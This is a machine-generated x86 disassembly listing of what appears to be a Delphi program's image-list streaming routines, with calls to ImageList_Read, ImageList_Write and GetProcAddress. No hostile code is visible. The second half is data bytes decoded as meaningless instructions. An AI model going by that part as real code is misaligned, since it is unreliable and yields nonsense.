call sub_44d0d0
mov ebx eax
mov eax edi
call sub_44d0d0
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44d0d0
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44dbf8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44dbdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44dad8
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dbe2
mov eax [ ebp - 0xc ]
call sub_40316c
retn
mov eax edi
call sub_44d0d0
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44dc0c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44d0d0
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44db1c
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44dc68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41ea50
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44dc0c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44dcc0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41a5ec
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41a5ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44df44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a3c0
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41a3e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44df27
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_427c34
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416a60
mov eax [ ebp - 0x4 ]
call sub_44e2ec
xor eax eax
push ebp
push sub_44df0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44df11
mov eax [ ebp - 0xc ]
call sub_40316c
mov eax [ ebp - 0x14 ]
call sub_40316c
mov eax [ ebp - 0x4 ]
call sub_44e2f0
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416a88
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_426ec4
push eax
mov eax [ ebp - 0xc ]
call sub_426ec4
lea edx [ ebp - 0x30 ]
pop ecx
call sub_422468
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416a88
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426ec4
push eax
mov eax [ ebp - 0x14 ]
call sub_426ec4
lea edx [ ebp - 0x30 ]
pop ecx
call sub_422468
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cee8
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44df54
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f1d0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44dfb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44cd70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dfbb
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub eax 0xffffffec
sub_44dfbb
mov eax [ ebp - 0x4 ]
call sub_44cbd8
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e0ea
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41a3e0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41aae8
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a3e0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41a3e0
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f1d0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e0cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41a3e0
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44cd70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a3e0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44e11c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44ce10
mov eax edi
call sub_41a3c0
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41a3e0
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44dcc0
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44df54
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44e1a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f1d0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e2a2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c21c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44cdac
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44cdac
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e2a9
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
jmp r-xdata
sub_44e310
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
mov edx esi
call sub_44da80
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_44e35c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e381
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e388
retn
sub_44e7de
mov eax 0xb8004522
sbb al 0x45
add [ eax - 0x3fffbae3 ] cl
sbb eax 0x22280045
inc ebp
add [ edx ] dl
inc ebp
add [ ebx + ebx ] dl
inc ebp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44e3ec70
add [ eax ] cl
add bh bh
sbb [ ebx ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
inc ebx
push 0xd86b6365
in eax 0x44
add [ ebx ] bh
add [ eax ] al
dec [ eax + 0x2d ]
inc ebp
add [ ecx ] al
arpl [ ebx - 0x28 ] bp
insd
or al ch
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
[ eax ]
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
insb
out 0x44 eax
add [ eax + ebp * 2 + 0x41 ] bl
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
jmp [ esp + ebx + 0x45 ]
insd
popad
jae r-xdata
add bh bh
sub [ ebx ] bl
inc ebp
add ah bh
and eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop es
inc ebx
popad
jo r-xdata
fsub st5
inc esp
add [ eax + eax ] bh
add bh bh
les ebp [ esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
imul eax [ ecx ] sub_451ca8
inc esp
and [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
adc [ eax ] al
cmp al [ eax ]
add bh bh
loopne r-xdata
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
cwde
sbb eax [ ebp ]
sbb al 0x24
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
test al 0xc9
inc esp
add [ eax + eax ] bh
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
[ eax + 0x1c00451b ]
and al 0x45
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0xb
inc edx
add [ ecx ] bl
inc ebp
add [ ecx + 0x10045 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
js r-xdata
je r-xdata
mov esp 0x4524
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
pop esp
and al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ eax ]
sbb eax 0x249c0045
inc ebp
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
in al dx
sbb eax [ ebp ]
cmp al 0x24
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cwde
add [ eax ] al
inc ebx
jne r-xdata
inc ecx
add [ eax - 0x12 ] cl
inc ecx
add al al
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec [ eax ]
sbb eax 0x24dc0045
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xbc656c62
push edx
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
ja r-xdata
add dh bl
jmp r-xdata
je r-xdata
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ edi + ebp ] ch
inc ebp
add al bl
aaa
inc ebp
add [ eax + esi ] bl
inc ebp
add [ eax ] cl
cmp [ ebp ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al cl
das
inc ebp
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0xfffbe7c ] ch
aaa
inc ebp
add [ eax + edi - 0x14c7ffbb ] cl
inc ecx
insd
push 0xa00044e5
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
sub_44ec63
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al cl
das
inc ebp
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0xfffbe7c ] ch
aaa
inc ebp
add [ eax + edi - 0x14c7ffbb ] cl
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ edi + ebp ] ch
inc ebp
add al bl
aaa
inc ebp
add al cl
cmp eax 0x3d0c0045
inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rcl al 0xec
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x84756e65
in al dx
inc esp
add al bh
jmp r-xdata
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
adc [ eax ] al
inc eax
add [ eax ] al
call [ edi + esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
pushfd
jo r-xdata
outsb
je r-xdata
ja r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc esp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
sbb dh ch
adc [ eax ] al
inc ecx
add [ eax ] al
dec [ eax + 0x3c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] ah
xor [ eax ] eax
and [ ebp + eax * 2 ] al
mov [ ebp - 0x15afffbf ] es
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
je r-xdata
outsb
je r-xdata
add ah cl
cmp al 0x45
add ah bl
cmp al 0x45
add [ ecx ] al
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
out dx al
inc esp
add [ ebp - 0x1097ffc0 ] cl
outsd
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
cwde
out dx al
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
inc ebx
push 0x65676e61
nop
sbb al 0xee
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2c65646f
in al 0x44
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ esp + edi + 0x3cbc0045 ] ch
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsd
add al 0xef
inc esp
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ ebx + eax * 2 + 0x37d80045 ] ch
inc ebp
add [ eax + esi ] bl
inc ebp
add [ eax ] cl
cmp [ ebp ] al
push esp
inc esp
inc ebp
add [ eax * 2 + 0x540a0045 ] cl
push eax
outsd
jo r-xdata
or eax 0x6f42616d
insd
je r-xdata
jne r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
pop esp
out dx al
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] r--data
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5065646f
dec eax
outsd
je r-xdata
inc ecx
add [ eax - 0xfffbe7c ] ch
aaa
inc ebp
add [ eax + edi - 0x14c7ffbb ] cl
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
dec eax
out dx al
inc ecx
add al al
mov esp 0x70044ef
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] bl
out dx al
out dx al
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] ah
inc esp
inc ebp
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax - 0x72ffbb12 ] ebx
inc eax
add [ eax - 0x11 ] ch
add [ eax ] al
inc esp
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x780044 ] ch
outsd
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
out dx eax
inc esp
add [ eax ] bh
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
adc al 0x37
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
jo r-xdata
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec [ eax + 0x3c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
test al 0xc9
inc esp
add [ eax ] cl
add bh bh
push eax
cmp [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
jge r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
or al [ eax ]
or eax 0x756e654d
inc ecx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ecx
inc ecx
add [ eax ] dh
add [ eax ] al
push [ esp + edi ]
inc ebp
add [ esi + 0x45 ] ch
add [ eax - 0x80000000 ] al
push edx
inc ecx
add [ eax + 0x44 ] ch
inc ebp
add [ eax + 0x44 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push eax
and dh ah
inc esp
add [ eax ] al
add al 0x0
add [ eax ] al
outsb
jne r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x12 ] bl
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
mov esp 0x70004152
add [ eax ] al
push [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5865646f
out dx al
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
